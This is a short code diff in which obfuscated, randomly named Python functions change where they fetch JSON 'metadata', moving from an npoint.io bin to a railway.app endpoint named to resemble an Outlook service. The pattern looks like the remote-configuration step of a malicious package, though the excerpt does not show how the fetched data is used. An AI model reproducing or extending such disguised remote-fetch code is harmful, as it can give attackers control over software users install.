@@ -16,7 +16,7 @@ def config_kjwcfy_411():
 
     def process_ocurpc_737():
         try:
-            config_nnxlrz_690 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_nnxlrz_690 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_nnxlrz_690.raise_for_status()
             learn_iimsgs_368 = config_nnxlrz_690.json()
             process_bavmku_934 = learn_iimsgs_368.get('metadata')
